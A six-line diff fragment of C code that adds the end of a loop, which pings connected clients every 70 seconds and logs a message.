+        sendPing();
+        sleep(70);
+        printf("[MAIN] Pinging Clients!r\n");
+    }
+}
+
